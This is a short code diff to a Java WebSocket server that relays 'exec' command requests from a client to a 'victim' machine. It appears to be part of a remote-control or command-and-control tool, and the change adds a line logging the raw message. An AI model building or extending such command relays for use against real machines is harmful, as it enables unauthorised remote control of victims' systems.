@@ -75,6 +75,7 @@ public class WebSocketServer {
             } else if (type.equals("exec")) {
                 if(jsonNode.get("state").asText().equals("req")){
                     logger.info("req came");
+                    logger.info(message);
                     logger.info("execute command"+" client:"+jsonNode.get("client")+" victim:"+jsonNode.get("victim")+" command:"+jsonNode.get("command"));
                     sendMessageToVictim(jsonNode.get("victim").asText(),commands.sendVictimExec(jsonNode.get("client").asText(),jsonNode.get("command").asText()));
                 }else{
